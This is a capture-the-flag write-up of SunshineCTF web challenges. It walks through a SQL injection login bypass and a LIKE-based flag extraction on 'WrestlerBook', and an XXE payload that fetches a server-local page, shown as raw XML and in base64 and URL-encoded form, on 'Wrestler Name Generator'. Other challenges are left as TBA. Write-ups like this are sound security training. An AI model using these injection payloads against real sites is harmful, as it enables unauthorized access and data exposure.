# Web Challenge
Lots of wrestlers. nice.
<br>
<br>
## 100 points: WrestlerBook
```
WrestlerBook is the social network for wrestlers, by wrestlers. WrestlerBook is exclusively for wrestlers, so if you didn't get an invite don't even bother trying to view our profiles.
```
<a href="http://archive.sunshinectf.org:19006">http://archive.sunshinectf.org:19006</a>
```
Author: dmaria
```
Opening the website:

![](/Images/2019/SunshineCTF/WrestlerBook.PNG)

It's a simple login screen, and being a basic web challenge, it's probably SQLi (SQL injection). First thing I do is try to login using '`' or '1'='1`' as both the username and the password. It works, but all you get is this:

![](/Images/2019/SunshineCTF/hulkhogie.PNG)

Looks like its going to be a bit more work than I thought. However, looking at the user info, there appears to be a flag section that's just empty for this user. Perhaps '`flag`' is a column in the database. I used the LIKE operator to test for an entry that contains '`sun`'. My payload therefore becomes:

username: `' or flag LIKE '%sun%' or '1'='2`

password: `' or '1'='2`

The `'1'='2` part of each section allows me to incorporate the ending quote while not afecting the query, since '1' is never equal to '2'. My payload worked:

<img src="https://cdn.discordapp.com/attachments/532350033241309226/563510097884741642/unknown.png">

flag: `sun{ju57_4n07h3r_5ql1_ch4ll}`
<br>
<br>
<br>
## 150 points: Wrestler Name Generator
```
Even better than the Wu-Tang name generator, legend has it that Hulk Hogan used this app to get his name.
```
<a href='http://archive.sunshinectf.org:19007'>http://archive.sunshinectf.org:19007</a>
```
Author: dmaria
```
Opening the website, we're greeted with this colorful page:

<img src="https://cdn.discordapp.com/attachments/532350033241309226/563510519831461909/unknown.png">

Viewing the page's source code gets us this gem of a script:
```
<script>
document.getElementById("button").onclick = function() {
  var firstName = document.getElementById("firstName").value;
  var lastName = document.getElementById("lastName").value;
  var input = btoa("<?xml version='1.0' encoding='UTF-8'?><input><firstName>" + firstName + "</firstName><lastName>" + lastName+ "</lastName></input>");
  window.location.href = "/generate.php?input="+encodeURIComponent(input);
};
</script>
```
Searching up XML exploitations, it appears as though this challenge will be XXE, or XML External Entity. But what are we trying to do? I pressed the "Generate" button with empty fields and got this page:

<img src="https://cdn.discordapp.com/attachments/532350033241309226/563511596836585485/unknown.png">

Opening the sourcecode, we see the following comment:

<img src="https://cdn.discordapp.com/attachments/532350033241309226/563511441164992533/unknown.png">

It's clear that we need to access this from server-side and direct the output to client-side. We can do this by loading in an external entity into any of the fields, so that when the website parses the `<lastname>` tag and puts it onto the page, we see the external entity. After searching, I got the following xml:
```
<?xml version='1.0' encoding='utf-8'?><!DOCTYPE lastNAME [<!ENTITY test SYSTEM "http://127.0.0.1/generate.php?">]><input><firstName></firstName><lastName>&test;</lastName></input>
```

This loads the page from server side and stores it into an entity called 'test'. `&test;` calls the value of the entity as the value between the lastName tags, so we should see something when we go to the website with that XML sent as the payload. How do we send it? Luckily, the url has a parameter '`input`' that is set equal to a base64 string. Returning to the first page, we see that the function `btoa` encodes its argument into base64, so we need to convert our exploit to base64:
```
PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0ndXRmLTgnPz48IURPQ1RZUEUgbGFzdE5BTUUgWzwhRU5USVRZIHRlc3QgU1lTVEVNICJodHRwOi8vMTI3LjAuMC4xL2dlbmVyYXRlLnBocD8iPl0+PGlucHV0PjxmaXJzdE5hbWU+PC9maXJzdE5hbWU+PGxhc3ROYW1lPiZ0ZXN0OzwvbGFzdE5hbWU+PC9pbnB1dD4=
```
Finally, URLencoding it gets us:
```
PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0ndXRmLTgnPz48IURPQ1RZUEUgbGFzdE5BTUUgWzwhRU5USVRZIHRlc3QgU1lTVEVNICJodHRwOi8vMTI3LjAuMC4xL2dlbmVyYXRlLnBocD8iPl0%2BPGlucHV0PjxmaXJzdE5hbWU%2BPC9maXJzdE5hbWU%2BPGxhc3ROYW1lPiZ0ZXN0OzwvbGFzdE5hbWU%2BPC9pbnB1dD4%3D
```
Going to the site (post-competition url, during competition domain was `ng.sunshinectf.org/`):
```
http://archive.sunshinectf.org:19007/generate.php?input=PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0ndXRmLTgnPz48IURPQ1RZUEUgbGFzdE5BTUUgWzwhRU5USVRZIHRlc3QgU1lTVEVNICJodHRwOi8vMTI3LjAuMC4xL2dlbmVyYXRlLnBocD8iPl0%2BPGlucHV0PjxmaXJzdE5hbWU%2BPC9maXJzdE5hbWU%2BPGxhc3ROYW1lPiZ0ZXN0OzwvbGFzdE5hbWU%2BPC9pbnB1dD4%3D
```
This nets us the flag:

<img src="https://cdn.discordapp.com/attachments/561665413918883840/563514724642193408/unknown.png">
<br>
<br>
<br>
## 150 points: Portfolio
```
Check out my development portfolio! I'm just getting started, so don't be too mean :(
```
<a href='http://archive.sunshinectf.org:19009'>http://archive.sunshinectf.org:19009</a>
```
Author: dmaria
```
TBA
<br>
<br>
<br>
## 300 points: Enter the Polygon 1
```
These photos are The Best There Is, The Best There Was and The Best There Ever Will Be. Give me your photos I'll EXAMINE if they meet the bar.
```
<a href='http://img.sunshinectf.org'>http://img.sunshinectf.org</a>
```
Author: Astor
```
TBA
<br>
<br>
<br>
## 300 points: Enter the Polygon 2
TBA
